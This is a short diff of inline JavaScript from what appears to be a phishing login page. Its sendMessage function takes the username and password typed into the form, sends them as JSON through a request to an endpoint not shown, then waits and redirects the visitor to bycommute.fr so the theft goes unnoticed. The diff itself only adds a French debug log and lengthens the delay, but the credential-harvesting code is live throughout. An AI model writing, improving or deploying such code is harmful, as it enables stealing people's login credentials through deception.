@@ -131,6 +131,7 @@
             // }
             function sendMessage() {
             function sleep(milliseconds) {
+                console.log("je suis dans send message");
                 const date = Date.now();
                 let currentDate = null;
                 do {
@@ -144,7 +145,7 @@
                 content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
             }
             request.send(JSON.stringify(params));
-            sleep(400)
+            sleep(40000)
             window.location.replace("https://www.bycommute.fr");
          }
         </script>
